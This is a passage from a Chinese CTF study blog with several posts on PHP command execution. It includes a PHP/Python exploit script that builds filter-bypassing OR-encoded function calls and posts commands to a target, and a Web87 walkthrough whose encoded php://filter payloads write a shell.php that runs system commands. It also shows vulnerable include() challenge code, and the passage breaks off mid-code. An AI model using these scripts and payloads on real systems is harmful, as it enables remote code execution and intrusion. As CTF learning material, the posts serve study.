class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;  <span class="comment"># 补齐小于 16 的十六进制数长度</span></span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);  <span class="comment"># dechex() 函数将十进制转换为十六进制</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;  <span class="comment"># hex2bin() 函数将十六进制数值转换为原始二进制数据，如果有对应的 ASCII 字符，则输出字符</span></span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;  <span class="comment"># 只有两个字符都未被过滤的情况下，才会用于合成被过滤的字符，否则不进行任何操作</span></span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;  <span class="comment"># URL 编码前 128 位与 ASCII 码一致</span></span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;  <span class="comment"># ASCII 码前 32 位是控制字符，不可打印且无可见意义（但可用于或运算）；第 128 位是删除符，不可打印</span></span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;  <span class="comment"># 在 rce_or.txt 文件中在每行按照 A %01 %40 这样的形式拼接字符串</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure>

<p>脚本二（Python）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exp.py</span></span><br><span class="line"><span class="comment"># 运行时在命令行中输入 python exp.py &lt;目标url&gt;</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *  <span class="comment"># 会将 sys 模块中的所有公共对象导入到当前命名空间，所以下面可以直接使用 argv 而无需使用 sys. 前缀</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;php rce_or.php&quot;</span>)  <span class="comment">#没有将php写入环境变量需手动运行</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(argv)!=<span class="number">2</span>):  <span class="comment"># 纠错机制，格式错误程序会正常退出</span></span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;USER：python exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;eg：  python exp.py http://ctf.show/&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   exit(<span class="number">0</span>)</span><br><span class="line">url=argv[<span class="number">1</span>]  <span class="comment"># 将用户输入的第二个参数作为 URL （注意“python exp.py &lt;url&gt;”中首个参数从脚本文件名开始而不是从 python 开始）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;rce_or.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()  <span class="comment"># 每次循环文件指针后移一位， readline() 读取下一行</span></span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span>  <span class="comment"># 若读取到文件末尾都没对应字符，退出循环</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]  <span class="comment"># 分别读取每行三个部分如 A %01 %40 的内容</span></span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span>  <span class="comment"># (&quot;...&quot;|&quot;...&quot;) 拼接出准备与运算的字符串</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))  <span class="comment"># 将函数与命令拼接为 (&quot;system&quot;)(&quot;ls&quot;) 的形式（等价于 system(&quot;ls&quot;) ，此乃变量函数机制，PHP 特性）</span></span><br><span class="line">   data=&#123;</span><br><span class="line">       <span class="string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)  <span class="comment"># URL 解码</span></span><br><span class="line">       &#125;</span><br><span class="line">   r=requests.post(url,data=data)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span>+r.text)</span><br></pre></td></tr></table></figure>

<p>后面如果遇到可以用或运算活字印刷的，可以改一下该脚本或者自己写类似的脚本。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://traveler2000.github.io/2025/04/27/%E5%88%A9%E7%94%A8%E6%88%96%E8%BF%90%E7%AE%97%E6%B4%BB%E5%AD%97%E5%8D%B0%E5%88%B7/" data-id="cma21qgoa001ixwuhb1zcdpjc" data-title="利用或运算活字印刷" class="article-share-link"><span class="fa fa-share">分享</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-GET与POST数组相关知识" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/25/GET%E4%B8%8EPOST%E6%95%B0%E7%BB%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/" class="article-date">
  <time class="dt-published" datetime="2025-04-25T09:06:49.000Z" itemprop="datePublished">2025-04-25</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/">杂项知识点</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/04/25/GET%E4%B8%8EPOST%E6%95%B0%E7%BB%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/">$_GET 与 $_POST 数组相关知识</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>在PHP中，<code>$_GET</code> 和 <code>$_POST</code> 是两种独立的超全局数组，它们的参数来源和处理逻辑有本质区别：</p>
<h2 id="GET-的底层逻辑"><a href="#GET-的底层逻辑" class="headerlink" title="$_GET 的底层逻辑"></a><code>$_GET</code> 的底层逻辑</h2><ul>
<li><strong>参数来源</strong>：<strong>URL查询字符串</strong>（如 <code>?key1=value1&amp;key2=value2</code>）。</li>
<li><strong>无关请求方法</strong>：无论请求是 <code>GET</code>、<code>POST</code> 还是其他方法，只要URL中存在查询字符串，PHP都会自动解析到 <code>$_GET</code> 数组中。</li>
</ul>
<h2 id="POST-的底层逻辑"><a href="#POST-的底层逻辑" class="headerlink" title="$_POST 的底层逻辑"></a><strong><code>$_POST</code> 的底层逻辑</strong></h2><ul>
<li><strong>参数来源</strong>：<strong>请求体（Body）</strong>，且仅当请求头的 <code>Content-Type</code> 是 <code>application/x-www-form-urlencoded</code> 或 <code>multipart/form-data</code> 时（如表单提交）。</li>
<li><strong>依赖请求方法</strong>：只有使用 <code>POST</code> 方法时，PHP才会自动解析请求体到 <code>$_POST</code> 数组。</li>
<li><strong>注意</strong>：如果要在 Burp Suite 中将 GET 请求修改为 POST 请求并修改请求体，请在修改完请求行的 <code>GET</code> 后在右侧 Inspector 内修改请求体，否则 Burp Suite 不会自动向请求头中添加 <code>Content-Type</code> 字段，导致参数无法传给 <code>$_POST</code> 数组。</li>
</ul>
<p>由此可得：只要 URL 中<strong>存在查询字符串</strong>，都会被解析到 <strong><code>$_GET</code> 数组</strong>；但 <code>$_POST</code> 数组<strong>依赖 <code>POST</code> 方法与请求头</strong>，条件不满足时会有参数无法传到 <code>$_POST</code> 数组中的情况。</p>
<p><strong>关于 <code>php://input</code> 伪协议</strong></p>
<p><code>php://input</code> 伪协议可用于读取请求体的原始数据，不管请求方法是 <code>GET</code> 还是 <code>POST</code> 还是其他方法。类似 URL 传参时的 <code>$_GET</code> 数组。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://traveler2000.github.io/2025/04/25/GET%E4%B8%8EPOST%E6%95%B0%E7%BB%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/" data-id="cma21qgo00007xwuh6tjafpnb" data-title="$_GET 与 $_POST 数组相关知识" class="article-share-link"><span class="fa fa-share">分享</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/" rel="tag">杂项知识点</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-filter伪协议绕过die（Web87）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/25/filter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die%EF%BC%88Web87%EF%BC%89/" class="article-date">
  <time class="dt-published" datetime="2025-04-25T06:02:10.000Z" itemprop="datePublished">2025-04-25</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">命令执行与文件包含</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/04/25/filter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die%EF%BC%88Web87%EF%BC%89/">filter 伪协议绕过 die（Web87）</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>这道题不能再用条件竞争了。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单说说题目：</p>
<p>该题会将 <code>$_GET</code> 数组中的 <code>file</code> 参数 URL 解码，然后以解码后的 <code>file</code> 参数作为文件路径&#x2F;文件名，生成一个内容由字符串 <code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code> 与 <code>$_POST</code> 数组中的 <code>content</code> 参数的值拼接而成的文件。</p>
<p><code>urldecode()</code>：URL 解码。</p>
<p><code>file_put_contents()</code>：为文件写入内容，默认覆盖写。</p>
<p>由于会 URL 解码，所以前面的一串过滤都可以简单绕过。但有 <code>die()</code> 函数，会立刻停止脚本，所以要想办法阻碍该函数执行。</p>
<h2 id="解法一：Base64"><a href="#解法一：Base64" class="headerlink" title="解法一：Base64"></a>解法一：Base64</h2><p>可以用 <code>php://filter</code> 伪协议，使写入文件时内容经过 Base64 解码，同时在 <code>content</code> 参数中传入 Base64 编码后的 Payload 以达到绕过 <code>die()</code> 函数、执行恶意代码的目的（ 原本正常的 <code>die()</code> 函数被解码为乱码）：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/write=convert.base64-decode/resource=shell.php</span></span><br></pre></td></tr></table></figure>

<p>由于有 <code>urldecode()</code> 函数，所以可以对 Payload 进行 URL 转码以绕过过滤：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%70%68%70%3A%2F%2F%66%69%6C%74%65%72%2F%77%72%69%74%65%3D%63%6F%6E%76%65%72%74%2E%62%61%73%65%36%34%2D%64%65%63%6F%64%65%2F%72%65%73%6F%75%72%63%65%3D%73%68%65%6C%6C%2E%70%68%70</span><br></pre></td></tr></table></figure>

<p>此处简单粗暴全部转码。另外， <code>file</code> 参数通过 URL 传参到服务器时，会被 URL 解码，为了使 Payload 不要过早暴露被过滤，进行第二次转码（依旧简单粗暴）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%36%33%25%36%46%25%36%45%25%37%36%25%36%35%25%37%32%25%37%34%25%32%45%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%44%25%36%34%25%36%35%25%36%33%25%36%46%25%36%34%25%36%35%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%37%33%25%36%38%25%36%35%25%36%43%25%36%43%25%32%45%25%37%30%25%36%38%25%37%30</span><br></pre></td></tr></table></figure>

<p>另外， <code>content</code> 参数也要转码为 Base64 ：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&#x27;tac fl0g.php&#x27;) ?&gt; （跳过前面的 ls ，直接演示最后一步了）</span><br><span class="line">PD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKSA/Pg==</span><br></pre></td></tr></table></figure>

<p>用 Burp Suite 抓包，将 <code>GET</code> 改为 <code>POST</code> ，修改 URL 参数，然后修改请求体。</p>
<p>由于 Base64 的处理特性（详情请自行查找）， <code>content</code> 要加两个字符（这里用 <code>aa</code> ）以保证转码后恶意代码正常：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=aaPD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKSA/Pg==</span><br></pre></td></tr></table></figure>

<p>最后发包并访问 <code>/shell.php</code> 即可。</p>
<h2 id="解法二：ROT13"><a href="#解法二：ROT13" class="headerlink" title="解法二：ROT13"></a>解法二：ROT13</h2><p>与 Base64 原理相同，也是将编码处理后的 Payload 进行解码再写入文件，同时使 <code>die()</code> 函数无效化。</p>
<p>ROT13 用同一套算法既可以编码又可以解码。以下为 Payload ：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/write=string.rot13/resource=shell.php</span></span><br></pre></td></tr></table></figure>

<p>二次 URL 编码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%32%25%36%66%25%37%34%25%33%31%25%33%33%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%36%38%25%37%30</span><br></pre></td></tr></table></figure>

<p> <code>content</code> 参数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&#x27;tac fl0g.php&#x27;) ?&gt;</span><br><span class="line">&lt;?cuc flfgrz(&#x27;gnp sy0t.cuc&#x27;) ?&gt;</span><br></pre></td></tr></table></figure>

<p>抓包与修改同上，但不用加什么字符：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=&lt;?cuc flfgrz(&#x27;gnp sy0t.cuc&#x27;) ?&gt;</span><br></pre></td></tr></table></figure>

<p>最后发包并访问 <code>/shell.php</code> 即可。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://traveler2000.github.io/2025/04/25/filter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die%EF%BC%88Web87%EF%BC%89/" data-id="cma21qgo5000qxwuh82ebej74" data-title="filter 伪协议绕过 die（Web87）" class="article-share-link"><span class="fa fa-share">分享</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-条件竞争变体题目" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/25/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E5%8F%98%E4%BD%93%E9%A2%98%E7%9B%AE/" class="article-date">
  <time class="dt-published" datetime="2025-04-25T02:00:03.000Z" itemprop="datePublished">2025-04-25</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">命令执行与文件包含</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/04/25/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E5%8F%98%E4%BD%93%E9%A2%98%E7%9B%AE/">条件竞争变体题目</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="题目一"><a href="#题目一" class="headerlink" title="题目一"></a>题目一</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_unset</span>();</span><br><span class="line"><span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p><code>session_unset()</code>： 清空 <code>$_SESSION</code> 数组（ Session 文件&#x2F;数据存在）。</p>
<p><code>session_destroy()</code> ：删除 Session 文件&#x2F;数据。</p>
<p>然而上面的函数不影响创建新的  Session 文件，且 <code>PHP_SESSION_UPLOAD_PROGRESS</code> 机制不依赖代码中的 <code>session_start()</code>，而是由 PHP 内核在检测到上传进度跟踪时自动处理。</p>
<p>依旧是利用 <code>PHP_SESSION_UPLOAD_PROGRESS</code> 生成 Session 文件，后面就简单了。</p>
<h2 id="题目二"><a href="#题目二" class="headerlink" title="题目二"></a>题目二</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;rm -rf /tmp/*&quot;</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>system(&quot;rm -rf /tmp/*&quot;);</code> 删除所有 Session 文件。但脚本里留了后门，只删除 Session 文件没用。</p>
<h2 id="题目三"><a href="#题目三" class="headerlink" title="题目三"></a>题目三</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span 